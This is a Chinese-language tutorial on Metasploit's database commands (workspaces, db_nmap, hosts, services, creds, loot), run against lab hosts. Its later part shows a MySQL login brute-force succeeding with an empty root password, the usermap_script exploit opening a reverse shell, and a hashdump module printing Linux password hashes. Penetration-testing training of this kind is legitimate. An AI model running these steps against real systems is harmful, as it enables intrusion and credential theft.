# Database
该系统允许快速轻松地访问扫描信息，并使我们能够从各种第三方工具导入和导出扫描结果。我们还可以使用这些信息快速配置模块选项。最重要的是，它保持我们的结果干净且有条理。
msf > help database

Database Backend Commands
=========================

    Command           Description
    -------           -----------
    db_connect        Connect to an existing database
    db_disconnect     Disconnect from the current database instance
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache
    db_status         Show the current database status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces

msf > hosts

Hosts
=====

address         mac                name            os_name  os_flavor  os_sp  purpose  info  comments
-------         ---                ----            -------  ---------  -----  -------  ----  --------
172.16.194.134                                     Unknown                    device
172.16.194.163                     172.16.194.163  Linux    Ubuntu            server
172.16.194.172  00:0C:29:D1:62:80  172.16.194.172  Linux    Ubuntu            server

msf > services -p 21

Services
========

host            port  proto  name  state  info
----            ----  -----  ----  -----  ----
172.16.194.172  21    tcp    ftp   open   vsftpd 2.3.4

#使用
在 Kali 中，您需要在使用数据库之前启动 PostgreSQL 服务器。
root@kali:~# systemctl start postgresql

启动 PostgreSQL 后，您需要使用 msfdb init 创建并初始化 msf 数据库。
root@kali:~# msfdb init
Creating database user 'msf'
Enter password for new role:
Enter it again:
Creating databases 'msf' and 'msf_test'
Creating configuration file in /usr/share/metasploit-framework/config/database.yml
Creating initial database schema

当我们加载 msfconsole 并运行 db_status 时，我们可以确认 Metasploit 已成功连接到数据库。
msf > db_status
[*] postgresql connected to msf

从 msfconsole 发出“workspace”命令，将显示当前选择的工作区。连接到数据库时会选择“默认”工作区，它由名称旁边的*表示。
msf > workspace
* default
  msfu
  lab1
  lab2
  lab3
  lab4
msf >

在 msfconsole 提示符下创建和删除工作区，只需使用-a 或-d，后面跟着名称即可。

msf > workspace -a lab4
[*] Added workspace: lab4
msf >


msf > workspace -d lab4
[*] Deleted workspace: lab4
msf > workspace

使用相同的命令并添加-h 开关，将为我们提供该命令的其他功能。

msf > workspace -h
Usage:
    workspace                  List workspaces
    workspace -v               List workspaces verbosely
    workspace [name]           Switch workspace
    workspace -a [name] ...    Add workspace(s)
    workspace -d [name] ...    Delete workspace(s)
    workspace -D               Delete all workspaces
    workspace -r     Rename workspace
    workspace -h               Show this help information

msf >

使用 msfconsole 中的 help 命令来查看可用的“db_”命令。
msf > help
...snip...

Database Backend Commands
=========================

    Command           Description
    -------           -----------
    creds             List all credentials in the database
    db_connect        Connect to an existing database
    db_disconnect     Disconnect from the current database instance
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache
    db_status         Show the current database status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces
    
# Importing and Scanning
我们可以从控制台直接扫描主机或网络，或者导入之前扫描的文件。让我们从导入“metasploitable 2”主机的 nmap 扫描开始。这是通过 db_import 命令后跟文件路径来完成的。

msf >  db_import /root/msfu/nmapScan
[*] Importing 'Nmap XML' data
[*] Import: Parsing with 'Rex::Parser::NmapXMLStreamParser'
[*] Importing host 172.16.194.172
[*] Successfully imported /root/msfu/nmapScan
msf > hosts

Hosts
=====

address         mac                name  os_name  os_flavor  os_sp  purpose  info  comments
-------         ---                ----  -------  ---------  -----  -------  ----  --------
172.16.194.172  00:0C:29:D1:62:80        Linux    Ubuntu            server

msf >

我们可以通过发出 hosts 命令来确认导入。这将显示我们当前工作区中存储的所有主机。我们还可以使用 db_nmap 命令直接从控制台扫描主机。扫描结果将保存在我们当前的数据库中。该命令的工作方式与命令行版本的 nmap 相同。
msf > db_nmap -A 172.16.194.134
[*] Nmap: Starting Nmap 5.51SVN ( http://nmap.org ) at 2012-06-18 12:36 EDT
[*] Nmap: Nmap scan report for 172.16.194.134
[*] Nmap: Host is up (0.00031s latency).
[*] Nmap: Not shown: 994 closed ports
[*] Nmap: PORT     STATE SERVICE      VERSION
[*] Nmap: 80/tcp   open  http         Apache httpd 2.2.17 ((Win32) mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4

...snip...

[*] Nmap: HOP RTT     ADDRESS
[*] Nmap: 1   0.31 ms 172.16.194.134
[*] Nmap: OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 14.91 seconds
msf >


msf > hosts

Hosts
=====

address         mac                name  os_name            os_flavor  os_sp  purpose  info  comments
-------         ---                ----  -------            ---------  -----  -------  ----  --------
172.16.194.134  00:0C:29:68:51:BB        Microsoft Windows  XP                server
172.16.194.172  00:0C:29:D1:62:80        Linux              Ubuntu            server

msf >

Backing Up Our Data  备份我们的数据
使用 db_export 命令，可以将我们收集的所有信息保存到一个 XML 文件中。这种格式可以轻松用于后续的报告目的。该命令有两个输出，一个是 xml 格式，它将导出当前存储在我们活动工作区中的所有信息；另一个是 pwdump 格式，它导出与使用/收集的凭据相关的所有内容。

msf >  db_export -h
Usage:
    db_export -f  [-a] [filename]
    Format can be one of: xml, pwdump
[-] No output file was specified

msf > db_export -f xml /root/msfu/Exported.xml
[*] Starting export of workspace msfu to /root/msfu/Exported.xml [ xml ]...
[*]     >> Starting export of report
[*]     >> Starting export of hosts
[*]     >> Starting export of events
[*]     >> Starting export of services
[*]     >> Starting export of credentials
[*]     >> Starting export of web sites
[*]     >> Starting export of web pages
[*]     >> Starting export of web forms
[*]     >> Starting export of web vulns
[*]     >> Finished export of report
[*] Finished export of workspace msfu to /root/msfu/Exported.xml [ xml ]...

# Using the Hosts Command
osts 命令之前用于确认我们数据库中的数据存在。让我们看看可用的不同选项，并了解如何使用它为我们提供快速且有用的信息。使用-h 选项发出命令将显示帮助菜单。

msf > hosts -h
Usage: hosts [ options ] [addr1 addr2 ...]

OPTIONS:
  -a,--add          Add the hosts instead of searching
  -d,--delete       Delete the hosts instead of searching
  -c <col1,col2>    Only show the given columns (see list below)
  -h,--help         Show this help information
  -u,--up           Only show hosts which are up
  -o          Send output to a file in csv format
  -O        Order rows by specified column number
  -R,--rhosts       Set RHOSTS from the results of the search
  -S,--search       Search string to filter by
  -i,--info         Change the info of a host
  -n,--name         Change the name of a host
  -m,--comment      Change the comment of a host
  -t,--tag          Add or specify a tag to a range of hosts

Available columns: address, arch, comm, comments, created_at, cred_count, detected_arch, exploit_attempt_count, host_detail_count, info, mac, name, note_count, os_family, os_flavor, os_lang, os_name, os_sp, purpose, scope, service_count, state, updated_at, virtual_host, vuln_count, tags

要求主机命令仅使用-c 开关显示 IP 地址和操作系统类型。

msf > hosts -c address,os_flavor

Hosts
=====

address         os_flavor
-------         ---------
172.16.194.134  XP
172.16.194.172  Ubuntu

Setting up Modules 
如果我们只想从扫描中找到基于 Linux 的机器。为此，我们将使用-S 选项。这个选项可以与我们之前的例子结合使用，帮助我们细化结果。

msf > hosts -c address,os_flavor -S Linux

Hosts
=====

address         os_flavor
-------         ---------
172.16.194.172  Ubuntu

msf >

# Services 
另一种搜索数据库的方式是使用 services 命令。与之前的例子类似，我们可以用很少的努力提取非常具体的信息。

msf > services -h

Usage: services [-h] [-u] [-a] [-r ] [-p >port1,port2>] [-s >name1,name2>] [-o ] [addr1 addr2 ...]

  -a,--add          Add the services instead of searching
  -d,--delete       Delete the services instead of searching
  -c <col1,col2>    Only show the given columns
  -h,--help         Show this help information
  -s <name1,name2>  Search for a list of service names
  -p <port1,port2>  Search for a list of ports
  -r      Only show [tcp|udp] services
  -u,--up           Only show services which are up
  -o          Send output to a file in csv format
  -R,--rhosts       Set RHOSTS from the results of the search
  -S,--search       Search string to filter by

Available columns: created_at, info, name, port, proto, state, updated_at

与 hosts 命令类似，我们可以指定要显示的字段。结合 -S 开关，我们还可以搜索包含特定字符串的服务。
msf > services -c name,info 172.16.194.134

Services
========

host            name          info
----            ----          ----
172.16.194.134  http          Apache httpd 2.2.17 (Win32) mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1
172.16.194.134  msrpc         Microsoft Windows RPC
172.16.194.134  netbios-ssn
172.16.194.134  http          Apache httpd 2.2.17 (Win32) mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1
172.16.194.134  microsoft-ds  Microsoft Windows XP microsoft-ds
172.16.194.134  mysql

搜索数据库中所有包含服务名称中包含字符串‘http’的主机。

msf > services -c name,info -S http

Services
========

host            name  info
----            ----  ----
172.16.194.134  http  Apache httpd 2.2.17 (Win32) mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1
172.16.194.134  http  Apache httpd 2.2.17 (Win32) mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1
172.16.194.172  http  Apache httpd 2.2.8 (Ubuntu) DAV/2
172.16.194.172  http  Apache Tomcat/Coyote JSP engine 1.1

# CSV Export 
主机和服务命令都提供了将查询结果保存到文件的方法。文件格式为逗号分隔值，或 CSV。在-o 后跟路径和文件名，此时屏幕上显示的信息将被保存到磁盘。

msf > services -s http -c port 172.16.194.134 -o /root/msfu/http.csv

[*] Wrote services to /root/msfu/http.csv

msf > hosts -S Linux -o /root/msfu/linux.csv
[*] Wrote hosts to /root/msfu/linux.csv

msf > cat /root/msfu/linux.csv
[*] exec: cat /root/msfu/linux.csv

address,mac,name,os_name,os_flavor,os_sp,purpose,info,comments
"172.16.194.172","00:0C:29:D1:62:80","","Linux","Debian","","server","",""

msf > cat /root/msfu/http.csv
[*] exec: cat /root/msfu/http.csv

host,port
"172.16.194.134","80"
"172.16.194.134","443"

# Creds 
creds 命令用于管理在我们数据库中找到和使用的针对目标的凭据。运行此命令而不带任何选项将显示当前保存的凭据。
msf > creds

Credentials
===========

host  port  user  pass  type  active?
----  ----  ----  ----  ----  -------

[*] Found 0 credentials.

与‘db_nmap‘命令类似，与凭据相关的成功结果将自动保存到我们的活动工作区。让我们运行辅助模块‘mysql_login‘，看看当 Metasploit 扫描我们的服务器时会发生什么。
msf  auxiliary(mysql_login) > run

[*] 172.16.194.172:3306 MYSQL - Found remote MySQL version 5.0.51a
[*] 172.16.194.172:3306 MYSQL - [1/2] - Trying username:'root' with password:''
[*] 172.16.194.172:3306 - SUCCESSFUL LOGIN 'root' : ''
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


msf  auxiliary(mysql_login) > creds

Credentials
===========

host            port  user  pass  type      active?
----            ----  ----  ----  ----      -------
172.16.194.172  3306  root        password  true

[*] Found 1 credential.
msf  auxiliary(mysql_login) >

可以使用 creds -a 命令将用户凭据添加到我们的数据库中。
msf > creds -a 172.16.194.134 -p 445 -u Administrator -P 7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
[*] Time: 2012-06-20 20:31:42 UTC Credential: host=172.16.194.134 port=445 proto=tcp sname= type=password user=Administrator pass=7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e::: active=true

msf > creds

Credentials
===========

host            port  user           pass                                                                  type      active?
----            ----  ----           ----                                                                  ----      -------
172.16.194.134  445   Administrator  7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::  password  true

[*] Found 1 credential.

# loot
一旦你攻破了一个系统（或三个），其中一个目标可能是检索哈希转储。无论是来自 Windows 系统还是*nix 系统。如果转储成功，这些信息将存储在我们的数据库中。我们可以使用 loot 命令查看这些转储。和几乎所有命令一样，添加-h 开关将显示更多信息。
msf > loot -h
Usage: loot
 Info: loot [-h] [addr1 addr2 ...] [-t <type1,type2>]
  Add: loot -f [fname] -i [info] -a [addr1 addr2 ...] [-t [type]
  Del: loot -d [addr1 addr2 ...]

  -a,--add          Add loot to the list of addresses, instead of listing
  -d,--delete       Delete *all* loot matching host and type
  -f,--file         File with contents of the loot to add
  -i,--info         Info of the loot to add
  -t <type1,type2>  Search for a list of types
  -h,--help         Show this help information
  -S,--search       Search string to filter by
  
ex:
msf  exploit(usermap_script) > exploit

[*] Started reverse double handler
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo 4uGPYOrars5OojdL;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "4uGPYOrars5OojdL\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (172.16.194.163:4444 -> 172.16.194.172:55138) at 2012-06-27 19:38:54 -0400

^Z
Background session 1? [y/N]  y

msf  exploit(usermap_script) > use post/linux/gather/hashdump
msf  post(hashdump) > show options

Module options (post/linux/gather/hashdump):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.

msf  post(hashdump) > sessions -l

Active sessions
===============

  Id  Type        Information  Connection
  --  ----        -----------  ----------
  1   shell unix               172.16.194.163:4444 -> 172.16.194.172:55138 (172.16.194.172)

msf  post(hashdump) > run

[+] root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
[+] sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh
[+] klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false
[+] msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
[+] postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
[+] user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,111,,:/home/user:/bin/bash
[+] service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash
[+] Unshadowed Password File: /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.hashes_264208.txt
[*] Post module execution completed



msf  post(hashdump) > loot

Loot
====

host            service  type          name                   content     info                            path
----            -------  ----          ----                   -------     ----                            ----
172.16.194.172           linux.hashes  unshadowed_passwd.pwd  text/plain  Linux Unshadowed Password File  /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.hashes_264208.txt
172.16.194.172           linux.passwd  passwd.tx              text/plain  Linux Passwd File               /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.passwd_953644.txt
172.16.194.172           linux.shadow  shadow.tx              text/plain  Linux Password Shadow File      /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.shadow_492948.txt


















